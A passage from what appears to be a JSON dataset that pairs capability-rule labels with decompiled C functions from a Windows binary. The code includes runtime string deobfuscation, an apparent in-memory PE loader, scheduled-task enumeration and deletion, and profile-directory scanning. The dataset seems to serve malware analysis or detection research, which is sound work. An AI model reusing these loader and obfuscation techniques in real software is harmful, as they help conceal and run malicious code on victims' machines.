(iVar6 != 0) {\n                do {\n                    iVar8 = 0;\n                    cVar3 = *(iVar6 + arg_8h);\n                    if (cVar3 != 0x0) {\n                        ppcVar9 = ppcVar1 + 0x210;\n                        do {\n                            iVar8 = iVar8 + 1;\n                            *ppcVar9 = cVar3;\n                            ppcVar9 = ppcVar9 + 2;\n                            cVar3 = (iVar6 + arg_8h)[iVar8];\n                        } while (cVar3 != 0x0);\n                    }\n                    iVar4 = iVar8 * 2;\n                    *(ppcVar1 + 0xe) = iVar4;\n                    *(ppcVar1 + 0x3a) = iVar4 + 2;\n                    ppcVar1[0xf] = ppcVar1 + 0x210;\n                    iVar8 = (**ppcVar1)(0, 0, ppcVar1 + 0xe, &var_14h);\n                    if (iVar8 < 0) {\n                        iVar8 = -0x3ffffc91;\n                        break;\n                    }\n                    var_4h = 0;\n                    iVar6 = var_ch[4];\n                    iVar5 = *var_ch;\n                    if ((*var_ch != 0) || (iVar5 = iVar6,  iVar6 != 0)) {\n                        var_8h = iVar5 + arg_8h;\n                        var_18h = iVar6 + arg_8h;\n                        while( true ) {\n                            ppcVar9 = *var_8h;\n                            if (ppcVar9 == NULL) break;\n                            if (ppcVar9 < 0) {\n                                if ((ppcVar9 < arg_8h) || (*(var_10h + 0x50) + arg_8h <= ppcVar9)) {\n                                    var_4h = *var_8h;\n                                    ppcVar9 = NULL;\n                                }\n                            }\n                            else {\n                                ppcVar9 = ppcVar9 + arg_8h;\n                            }\n                            if (ppcVar9 != NULL) {\n                                pcVar10 = ppcVar9 + 2;\n                                iVar6 = 0;\n                                cVar3 = *pcVar10;\n                                while (cVar3 != 0x0) {\n                                    iVar6 = iVar6 + 1;\n                                    cVar3 = pcVar10[iVar6];\n                                }\n                                *(ppcVar1 + 0xe) = iVar6;\n                                ppcVar1[0xf] = pcVar10;\n                                ppcVar9 = ppcVar1 + 0xe;\n                                *(ppcVar1 + 0x3a) = iVar6 + 1;\n                            }\n                            iVar8 = (*ppcVar1[2])(var_14h, ppcVar9, var_4h, &var_20h);\n                            if (iVar8 < 0) {\n                                iVar8 = -0x3fffff86;\n                                break;\n                            }\n                            *var_18h = var_20h;\n                            var_8h = var_8h + 1;\n                            var_18h = var_18h + 1;\n                        }\n                    }\n                    iVar6 = var_ch[8];\n                    var_ch = var_ch + 5;\n                } while (iVar6 != 0);\n                if (iVar8 < 0) {\n                    return;\n                }\n            }\n        }\n        pcVar10 = var_10h;\n        var_ch = *(var_10h + 0x54);\n        iVar6 = (*ppcVar1[4])(0xffffffff, &arg_8h, &var_ch, 4, &var_28h);\n        if (var_1ch != 0) {\n            puVar11 = pcVar10 + var_24h + 0x3c;\n            do {\n                if (iVar6 < 0) {\n                    return;\n                }\n                uVar2 = *puVar11;\n                if ((uVar2 & 0x20000000) == 0) {\n                    if ((uVar2 & 0x40000000) == 0) {\n                        cVar7 = '\\x04';\n                    }\n                    else {\n                        cVar7 = (-((uVar2 & 0x80000000) != 0) & 2U) + 2;\n                    }\n                }\n                else {\n                    cVar7 = (-((uVar2 & 0x80000000) != 0) & 0x20U) + 0x20;\n                }\n                var_ch = puVar11[-7];\n                var_24h = puVar11[-6] + arg_8h;\n                iVar6 = (*ppcVar1[4])(0xffffffff, &var_24h, &var_ch, cVar7, &var_28h);\n                puVar11 = puVar11 + 10;\n                uVar12 = uVar12 + 1;\n                pcVar10 = var_10h;\n            } while (uVar12 < var_1ch);\n        }\n        if (-1 < iVar6) {\n            (*(*(pcVar10 + 0x28) + arg_8h))(arg_8h, 1, ppcVar1 + 6);\n        }\n    }\n    return;\n}\n",
        "token_count": 1585
    },
    "00410d6e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00410d6e(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    int16_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    char cVar8;\n    char cVar9;\n    uint uVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    uint *puVar13;\n    uint *puVar14;\n    uint lpFileName;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t *var_20h;\n    int32_t *var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t *ppv;\n    int32_t var_ch;\n    int32_t pszFirst;\n    uint *var_4h;\n    \n    var_34h = 0x391c3010;\n    var_38h = 0;\n    var_1ch = NULL;\n    ppv = NULL;\n    var_20h = NULL;\n    var_14h = 0;\n    var_ch = 0;\n    var_30h = 0x30564702;\n    var_2ch._0_1_ = 0x5c;\n    var_2ch._1_2_ = 0x6e39;\n    var_2ch._3_1_ = 0x47;\n    var_28h = 0x39703074;\n    var_24h._0_2_ = 0x476e;\n    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    var_4h = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar10);\n    var_18h = 0xbe;\n    uVar12 = 0;\n    do {\n        *(var_4h + uVar12) = *(var_4h + uVar12) * -0x42;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x19);\n    pszFirst = 0;\n    puVar13 = var_4h;\n    for (iVar11 = 6; iVar11 != 0; iVar11 = iVar11 + -1) {\n        *puVar13 = 0;\n        puVar13 = puVar13 + 1;\n    }\n    *puVar13 = 0;\n    iVar11 = &var_34h - var_4h;\n    do {\n        iVar6 = pszFirst;\n        pcVar1 = var_4h + pszFirst;\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_28h + iVar6 % 6);\n        uVar3 = pcVar1[iVar11];\n        cVar9 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        pszFirst = pszFirst + 1;\n        *pcVar1 = cVar9 + ((uVar2 ^ uVar3) - cVar8);\n    } while (pszFirst < 0xc);\n    iVar11 = (*_sym.imp.ole32.dll_CoInitialize)(0);\n    puVar13 = var_4h;\n    if (-1 < iVar11) {\n        iVar11 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x4156a8, 0, 1, 0x415698, &ppv);\n        puVar13 = var_4h;\n        if ((-1 < iVar11) && (ppv != NULL)) {\n            iVar11 = (**(*ppv + 0x14))(ppv, &var_1ch);\n            puVar13 = var_4h;\n            if ((-1 < iVar11) && (var_1ch != NULL)) {\n                iVar11 = (**(*var_1ch + 0xc))(var_1ch, 0xf, &var_14h, &var_ch);\n                puVar13 = var_4h;\n                pcVar5 = _sym.imp.ole32.dll_CoTaskMemFree;\n                while ((-1 < iVar11 && (var_ch != 0))) {\n                    do {\n                        var_ch = var_ch + -1;\n                        uVar10 = *(var_14h + var_ch * 4);\n                        var_18h = uVar10;\n                        iVar11 = (**(*ppv + 0x18))(ppv, uVar10, 0x415688, &var_20h);\n                        if ((-1 < iVar11) && (var_20h != NULL)) {\n                            pszFirst = 0;\n                            var_4h = NULL;\n                            iVar11 = (**(*var_20h + 0x84))(var_20h, &pszFirst);\n                            if ((-1 < iVar11) && (pszFirst != 0)) {\n                                iVar11 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, *0x4279dc);\n                                if ((iVar11 != 0) &&\n                                   ((iVar11 = (**(*var_20h + 0x8c))(var_20h, &var_4h),  -1 < iVar11 && (var_4h != NULL))\n                                   )) {\n                                    iVar11 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(var_4h, puVar13);\n                                    puVar7 = var_4h;\n                                    if ((iVar11 != 0) &&\n                                       (((*var_4h == 0x22 && (*(var_4h + 1) == 0x3a)) && (*(var_4h + 6) == 0x5c)))) {\n                                        puVar14 = &lpFileName;\n                                        for (iVar11 = 0x208; iVar11 != 0; iVar11 = iVar11 + -1) {\n                                            *puVar14 = 0;\n                                            puVar14 = puVar14 + 1;\n                                        }\n                                        puVar14 = puVar13;\n                                        do {\n                                            iVar4 = *puVar14;\n                                            puVar14 = puVar14 + 2;\n                                        } while (iVar4 != var_38h);\n                                        iVar11 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(puVar7, puVar13);\n                                        (*_sym.imp.SHLWAPI.dll_StrCpyNW)\n                                                  (&lpFileName, var_4h + 2, \n                                                   ((iVar11 - var_4h >> 1) - 2) + (puVar14 - (puVar13 + 2) >> 1));\n                                        iVar11 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(&lpFileName);\n                                        uVar10 = var_18h;\n                                        if (iVar11 == -1) {\n                                            (**(*ppv + 0x1c))(ppv, var_18h);\n                                        }\n                                    }\n                                    (*pcVar5)(var_4h);\n                                }\n                                (*pcVar5)(pszFirst);\n                            }\n                            (**(*var_20h + 8))(var_20h);\n                        }\n                        (*pcVar5)(uVar10);\n                    } while (var_ch != 0);\n                    (*pcVar5)(var_14h);\n                    iVar11 = (**(*var_1ch + 0xc))(var_1ch, 0xf, &var_14h, &var_ch);\n                }\n                (**(*var_1ch + 8))(var_1ch);\n            }\n            (**(*ppv + 8))(ppv);\n        }\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    uVar12 = 0;\n    do {\n        *(puVar13 + uVar12) = *(puVar13 + uVar12) + -0x42;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x19);\n    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar13);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar10);\n    return;\n}\n",
        "token_count": 1800
    },
    "0041116c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041116c(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    uint uVar5;\n    char cVar6;\n    char cVar7;\n    uint uVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint extraout_ECX;\n    int32_t iVar12;\n    uint *puVar13;\n    code *pcVar14;\n    uint lpFindFileData;\n    uint psz1;\n    int32_t var_84h;\n    int32_t var_80h;\n    uint lpcchSize;\n    uint var_78h;\n    int32_t var_74h;\n    uint var_70h;\n    int32_t var_6ch;\n    int32_t var_68h;\n    uint ARG_0;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint lpProfileDir;\n    uint *psz2;\n    uint *var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1dh;\n    uint var_19h;\n    uint var_15h;\n    uint var_11h;\n    uint var_dh;\n    uint var_9h;\n    uint var_5h;\n    uint var_1h;\n    \n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    pcVar14 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    lpProfileDir = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n    uVar8 = (*pcVar4)(8, 0x208);\n    var_60h = (*pcVar14)(uVar8);\n    uVar8 = (*pcVar4)(8, 0x208);\n    ARG_0 = (*pcVar14)(uVar8);\n    lpcchSize = 0x104;\n    var_28h = 0x7223772b;\n    var_24h._0_2_ = 0x5331;\n    var_24h._2_1_ = 6;\n    stack0xffffffdb = 0x72722077;\n    var_1dh = 0x29773453;\n    var_19h = 0x13532672;\n    var_15h._0_1_ = 0x77;\n    var_15h._1_2_ = 0x7225;\n    var_15h._3_1_ = 0x3c;\n    var_11h = 0x3f770053;\n    var_dh = 0x33530e72;\n    var_9h = 0x3f722977;\n    var_5h._0_1_ = 0x53;\n    var_5h._1_2_ = 0x7717;\n    var_5h._3_1_ = 0x4c;\n    var_1h._0_1_ = 0x72;\n    var_30h = 0x724c7767;\n    var_2ch._0_2_ = 0x5352;\n    fcn.004121e7(extraout_ECX);\n    iVar12 = 0;\n    var_34h = &var_28h - var_74h;\n    do {\n        pcVar1 = var_74h + iVar12;\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_30h + iVar12 % 6);\n        uVar3 = pcVar1[var_34h];\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        iVar12 = iVar12 + 1;\n        *pcVar1 = cVar7 + ((uVar2 ^ uVar3) - cVar6);\n    } while (iVar12 < 0x28);\n    var_28h = 0x61257629;\n    var_24h._0_2_ = 0x4a08;\n    var_24h._2_1_ = 0x2c;\n    stack0xffffffdb = 0xc613476;\n    var_1dh = 0x976094a;\n    var_19h = 0x74a3461;\n    var_15h._0_1_ = 0x76;\n    var_15h._1_2_ = 0x6136;\n    var_15h._3_1_ = 0x19;\n    var_11h = 0x976044a;\n    var_dh = 0xd4a2c61;\n    var_9h = 0x8613876;\n    var_5h._0_1_ = 0x4a;\n    var_5h._1_2_ = 0x7668;\n    var_30h = 0x61557668;\n    var_2ch._0_2_ = 0x4a78;\n    fcn.0041224e(var_74h);\n    pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_34h = &var_28h - var_6ch;\n    psz2 = NULL;\n    do {\n        puVar13 = psz2;\n        pcVar1 = var_6ch + psz2;\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_30h + puVar13 % 6);\n        uVar3 = pcVar1[var_34h];\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar8 = lpProfileDir;\n        psz2 = psz2 + 1;\n        *pcVar1 = cVar7 + ((uVar2 ^ uVar3) - cVar6);\n    } while (psz2 < 0x26);\n    var_84h = var_6ch;\n    var_80h = var_74h;\n    iVar12 = (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(lpProfileDir, &lpcchSize);\n    uVar5 = var_60h;\n    if (iVar12 != 0) {\n        (*_sym.imp.USER32.dll_wsprintfW)(var_60h, L\"%s\\\\*\", uVar8);\n        iVar12 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(uVar5, &lpFindFileData);\n        var_34h = iVar12;\n        while (iVar12 != -1) {\n            iVar9 = (*_sym.imp.SHLWAPI.dll_StrCmpW)(&psz1, 0x415c9c);\n            if ((iVar9 != 0) && (iVar9 = (*_sym.imp.SHLWAPI.dll_StrCmpW)(&psz1, 0x415ca0),  iVar9 != 0)) {\n                var_30h = 0;\n                var_4ch = 0x6840611d;\n                var_48h._0_2_ = 0x424d;\n                var_54h = 0x686a6141;\n                var_50h._0_2_ = 0x424d;\n                var_5ch = 0x35367532;\n                var_58h._0_2_ = 0x6950;\n                do {\n                    uVar8 = (*pcVar14)(8, 0xd);\n                    psz2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n                    uVar11 = 0;\n                    do {\n                        *(psz2 + uVar11) = *(psz2 + uVar11) ^ 0xcd;\n                        uVar11 = uVar11 + 1;\n                    } while (uVar11 < 0xd);\n                    *psz2 = 0;\n                    psz2[1] = 0;\n                    psz2[2] = 0;\n                    *(psz2 + 3) = 0;\n                    iVar12 = 0;\n                    var_3ch = &var_4ch - psz2;\n                    do {\n                        pcVar1 = psz2 + iVar12;\n                        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        uVar2 = *(&var_54h + iVar12 % 6);\n                        uVar3 = pcVar1[var_3ch];\n                        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        uVar8 = var_60h;\n                        *pcVar1 = cVar7 + ((uVar2 ^ uVar3) - cVar6);\n                        iVar12 = iVar12 + 1;\n                    } while (iVar12 < 6);\n                    (*_sym.imp.SHLWAPI.dll_StrCpyW)(var_60h, lpProfileDir);\n                    (*_sym.imp.SHLWAPI.dll_StrCatW)(uVar8, psz2);\n                    var_15h._1_2_ = 0x7517;\n                    var_15h._3_1_ = 0x45;\n                    var_11h = 0x17690c35;\n                    var_dh = 0xc354575;\n                    var_9h = 0x45751769;\n                    var_5h._0_1_ = 0x35;\n                    var_5h._1_2_ = 0x6950;\n                    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                    var_3ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n                    uVar11 = 0;\n                    do {\n                        *(var_3ch + uVar11) = *(var_3ch + uVar11) * -0x42;\n                        uVar11 = uVar11 + 1;\n                    } while (uVar11 < 0x25);\n                    puVar13 = var_3ch;\n                    for (iVar12 = 9; iVar12 != 0; iVar12 = iVar12 + -1) {\n                        *puVar13 = 0;\n                        puVar13 = puVar13 + 1;\n                    }\n                    var_68h = 0;\n                    *puVar13 = 0;\n                    iVar12 = 1 - var_3ch;\n                    do {\n                        iVar9 = var_68h;\n                        pcVar1 = var_3ch + var_68h;\n                        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        uVar2 = *(&var_5ch + iVar9 % 6);\n                        uVar3 = pcVar1[&var_15h + iVar12];\n                        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        uVar11 = var_30h;\n                        puVar13 = var_3ch;\n                        var_68h = var_68h + 1;\n                        *pcVar1 = cVar7 + ((uVar2 ^ uVar3) - cVar6);\n                    } while (var_68h < 0x12);\n                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, var_3ch, lpProfileDir, &psz1, (&var_84h)[var_30h]);\n                    fcn.00409dd7(1);\n                    uVar10 = 0;\n                    do {\n                        pcVar1 = puVar13 + uVar10;\n                        *pcVar1 = *pcVar1 + -0x5d;\n                        pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        uVar10 = uVar10 + 1;\n                    } while (uVar10 < 0x25);\n                    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar13);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n                    uVar10 = 0;\n                    do {\n                        *(psz2 + uVar10) = *(psz2 + uVar10) * -0x70;\n                        uVar10 = uVar10 + 1;\n                    } while (uVar10 < 0xd);\n                    uVar8 = (*pcVar14)(0, psz2);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n                    var_30h = uVar11 + 1;\n                    iVar12 = var_34h;\n                } while (var_30h < 2);\n            }\n            iVar9 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iVar12, &lpFindFileData);\n            if (iVar9 == 0) {\n                (*_sym.imp.KERNEL32.dll_FindClose)(iVar12);\n                iVar12 = -1;\n                var_34h = iVar12;\n            }\n        }\n    }\n    var_24h._0_2_ = 0x344c;\n    var_24h._2_1_ = 3;\n    stack0xffffffdb = 0x47694a69;\n    var_1dh = 0xc331d50;\n    var_19h = 0x61693d34;\n    var_15h._0_1_ = 0x69;\n    var_15h._1_2_ = 0x505b;\n    var_15h._3_1_ = 6;\n    var_11h = 0x75341d33;\n    var_dh = 0x60696f69;\n    var_9h = 0x4330c50;\n    var_5h._0_1_ = 0x34;\n    var_5h._1_2_ = 0x6920;\n    var_5h._3_1_ = 0x33;\n    var_1h._0_1_ = 0x69;\n    var_3ch = 0x69503469;\n    var_38h._0_1_ = 0x33;\n    uVar8 = (*pcVar14)(8, 0x49);\n    iVar12 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n    uVar11 = 0;\n    do {\n        *(iVar12 + uVar11) = *(iVar12 + uVar11) ^ 0xc6;\n        uVar11 = uVar11 + 1;\n    } while (uVar11 < 0x49);\n    sub.ntdll.dll_memset(iVar12, 0, 0x49);\n    var_34h = 0;\n    var_30h = &var_24h - iVar12;\n    do {\n        iVar9 = var_34h;\n        pcVar1 = iVar12 + var_34h;\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_3ch + iVar9 % 5);\n        uVar3 = pcVar1[var_30h];\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_34h = var_34h + 1;\n        *pcVar1 = cVar7 + ((uVar2 ^ uVar3) - cVar6);\n    } while (var_34h < 0x24);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar12, lpProfileDir, 0x104);\n    fcn.00409dd7(1);\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_60h);\n    pcVar14 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    uVar8 = (*pcVar4)(0, ARG_0);\n    (*pcVar14)(uVar8);\n    uVar8 = (*pcVar4)(0, lpProfileDir);\n    (*pcVar14)(uVar8);\n    uVar11 = 0;\n    do {\n        *(iVar12 + uVar11) = *(iVar12 + uVar11) * '\\x16';\n        uVar11 = uVar11 + 1;\n    } while (uVar11 < 0x49);\n    uVar8 = (*pcVar4)(0, iVar12);\n    (*pcVar14)(uVar8);\n    fcn.00412229();\n    fcn.004121c2();\n    return;\n}\n",
        "token_count": 3716
    },
    "004116d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004116d8(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    int16_t iVar4;\n    code *pcVar5;\n    char cVar6;\n    char cVar7;\n    uint uVar8;\n    int16_t *piVar9;\n    uchar *puVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint *puVar14;\n    int16_t *piVar15;\n    uint *puVar16;\n    uint32_t uVar17;\n    uint *puVar18;\n    uint lpFindFileData;\n    uint lpString1;\n    uint var_e0h;\n    uint *var_dch;\n    int32_t var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    int32_t var_cch;\n    uint var_c8h;\n    int32_t var_c4h;\n    int16_t *var_c0h;\n    uint var_bch;\n    uchar *ARG_0;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_a9h;\n    uint var_a5h;\n    uint var_a1h;\n    uint var_9dh;\n    uint var_99h;\n    uint var_93h;\n    uint var_8fh;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint *var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    uchar *var_50h;\n    uint *lpString2;\n    uint32_t var_48h;\n    uint32_t hFindFile;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    ushort var_30h;\n    uchar var_2eh;\n    uint var_2dh;\n    uint var_29h;\n    uint var_25h;\n    uint var_21h;\n    uint var_1dh;\n    uint var_19h;\n    uint var_15h;\n    uchar var_11h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.USERENV.dll_GetProfilesDirectoryW;\n    var_bch = 0;\n    var_10h = 0;\n    (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(0, &var_10h);\n    if (var_10h != 0) {\n        var_10h = var_10h + 10;\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_10h * 2);\n        piVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n        var_c0h = piVar9;\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_10h * 2);\n        var_50h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n        puVar10 = NULL;\n        if (piVar9 != NULL) {\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n            puVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n            puVar16 = &lpFindFileData;\n            ARG_0 = puVar10;\n            for (iVar12 = 0x250; iVar12 != 0; iVar12 = iVar12 + -1) {\n                *puVar16 = 0;\n                puVar16 = puVar16 + 1;\n            }\n            for (iVar12 = 0x208; iVar12 != 0; iVar12 = iVar12 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            puVar10 = var_50h;\n            for (iVar12 = var_10h * 2; iVar12 != 0; iVar12 = iVar12 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            piVar15 = piVar9;\n            for (iVar12 = var_10h * 2; iVar12 != 0; iVar12 = iVar12 + -1) {\n                *piVar15 = 0;\n                piVar15 = piVar15 + 1;\n            }\n            iVar12 = (*pcVar5)(piVar9, &var_10h);\n            puVar10 = ARG_0;\n            if (iVar12 != 0) {\n                iVar12 = var_50h - piVar9;\n                do {\n                    iVar4 = *piVar9;\n                    *(iVar12 + piVar9) = iVar4;\n                    piVar9 = piVar9 + 1;\n                } while (iVar4 != 0);\n                var_5ch = 0x535f5a13;\n                var_58h = 0x5a65387a;\n                var_54h._0_2_ = 0x5375;\n                var_ch = 0x53755a4f;\n                var_8h._0_2_ = 0x3854;\n                fcn.0040a1e8(piVar9);\n                hFindFile = &var_5ch - var_dch;\n                lpString2 = NULL;\n                do {\n                    puVar16 = lpString2;\n                    pcVar1 = var_dch + lpString2;\n                    cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    uVar2 = *(&var_ch + puVar16 % 6);\n                    uVar3 = pcVar1[hFindFile];\n                    cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    lpString2 = lpString2 + 1;\n                    *pcVar1 = cVar7 + ((uVar2 ^ uVar3) - cVar6);\n                    puVar16 = var_dch;\n                } while (lpString2 < 10);\n                do {\n                    iVar4 = *puVar16;\n                    puVar16 = puVar16 + 2;\n                } while (iVar4 != 0);\n                hFindFile = puVar16 - var_dch;\n                puVar16 = var_50h + -2;\n                do {\n                    piVar9 = puVar16 + 2;\n                    puVar16 = puVar16 + 2;\n                } while (*piVar9 != 0);\n                for (uVar13 = hFindFile >> 2; uVar13 != 0; uVar13 = uVar13 - 1) {\n                    *puVar16 = *var_dch;\n                    var_dch = var_dch + 1;\n                    puVar16 = puVar16 + 1;\n                }\n                for (uVar13 = hFindFile & 3; uVar13 != 0; uVar13 = uVar13 - 1) {\n                    *puVar16 = *var_dch;\n                    var_dch = var_dch + 1;\n                    puVar16 = puVar16 + 1;\n                }\n                hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(var_50h, &lpFindFileData);\n                if (hFindFile != -1) {\n                    var_60h = 0x36367577;\n                    var_6ch = 0x36367559;\n                    var_68h._0_1_ = 0x53;\n                    var_84h = 0x484a5a4a;\n                    var_80h._0_2_ = 0x6437;\n                    var_ch = 0x48645a64;\n                    var_8h._0_2_ = CONCAT11(var_8h._1_1_, 0x37);\n                    var_d4h = 0x2c;\n                    do {\n                        uVar17 = 0;\n                        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 9);\n                        lpString2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n                        uVar13 = uVar17;\n                        do {\n                            *(lpString2 + uVar13) = *(lpString2 + uVar13) ^ 0xbf;\n                            uVar13 = uVar13 + 1;\n                        } while (uVar13 < 9);\n                        *lpString2 = 0;\n                        lpString2[1] = 0;\n                        *(lpString2 + 2) = 0;\n                        var_48h = &var_60h - lpString2;\n                        do {\n                            pcVar1 = lpString2 + uVar17;\n                            cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                            uVar2 = *(&var_6ch + uVar17 % 5);\n                            uVar3 = pcVar1[var_48h];\n                            cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                            uVar17 = uVar17 + 1;\n                            *pcVar1 = cVar7 + ((uVar2 ^ uVar3) - cVar6);\n                        } while (uVar17 < 4);\n                        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n                        var_64h = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar8);\n                        uVar13 = 0;\n                        do {\n                            *(var_64h + uVar13) = *(var_64h + uVar13) * '\\x18';\n                            uVar13 = uVar13 + 1;\n                        } while (uVar13 < 0xd);\n                        *var_64h = 0;\n                        var_64h[1] = 0;\n                        var_64h[2] = 0;\n                        *(var_64h + 3) = 0;\n                        var_48h = &var_84h - var_64h;\n                        iVar12 = 0;\n                        do {\n                            pcVar1 = var_64h + iVar12;\n                            cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                            uVar2 = *(&var_ch + iVar12 % 5);\n                            uVar3 = pcVar1[var_48h];\n                            cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                            puVar16 = lpString2;\n                            *pcVar1 = cVar7 + ((uVar2 ^ uVar3) - cVar6);\n                            iVar12 = iVar12 + 1;\n                        } while (iVar12 < 6);\n                        puVar18 = &lpString1;\n                        iVar12 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(puVar18, lpString2);\n                        puVar14 = var_64h;\n                        if (((iVar12 != 0) &&\n                            (iVar12 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, var_64h),  iVar12 != 0)) &&\n                           ((lpFindFileData & 